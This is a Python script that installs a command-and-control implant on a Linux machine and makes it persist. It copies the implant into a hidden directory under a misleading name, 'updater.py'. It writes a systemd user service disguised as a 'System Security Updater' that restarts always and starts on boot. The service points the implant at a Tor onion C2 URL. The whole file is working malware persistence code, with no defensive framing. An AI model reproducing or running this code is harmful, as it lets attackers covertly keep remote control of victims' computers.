import os
import sys
import shutil
import subprocess
import argparse

def install_implant(url, tor_port):
    
    home_dir = os.path.expanduser("~")
    install_dir = os.path.join(home_dir, ".local", "share", "system-updater")
    implant_src = "implant.py" 
    implant_dest = os.path.join(install_dir, "updater.py")
    service_file_path = os.path.join(home_dir, ".config", "systemd", "user", "system-updater.service")


    if not os.path.exists(install_dir):
        os.makedirs(install_dir)
        print(f"[*] Created hidden directory: {install_dir}")


    
    if os.path.exists("implant/implant.py"):
        src = "implant/implant.py"
    elif os.path.exists("implant.py"):
        src = "implant.py"
    else:
        print("[!] Could not find implant.py. Make sure you are running this from the project root or implant directory.")
        return

    shutil.copy(src, implant_dest)
    print(f"[*] Copied implant to: {implant_dest}")

    
    service_content = f"""[Unit]
Description=System Security Updater
After=network.target

[Service]
ExecStart=/usr/bin/python3 {implant_dest} --url {url} --tor-port {tor_port}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
    
    
    service_dir = os.path.dirname(service_file_path)
    if not os.path.exists(service_dir):
        os.makedirs(service_dir)

    with open(service_file_path, "w") as f:
        f.write(service_content)
    print(f"[*] Created systemd service: {service_file_path}")

   
    try:
        subprocess.run(["systemctl", "--user", "daemon-reload"], check=True)
        subprocess.run(["systemctl", "--user", "enable", "system-updater"], check=True)
        subprocess.run(["systemctl", "--user", "start", "system-updater"], check=True)
        print("[+] Persistence established! Implant is running and will auto-start on boot.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error enabling service: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='C2 Onion URL', required=True)
    parser.add_argument('--tor-port', help='Tor SOCKS port', default=9050, type=int)
    args = parser.parse_args()

    install_implant(args.url, args.tor_port)
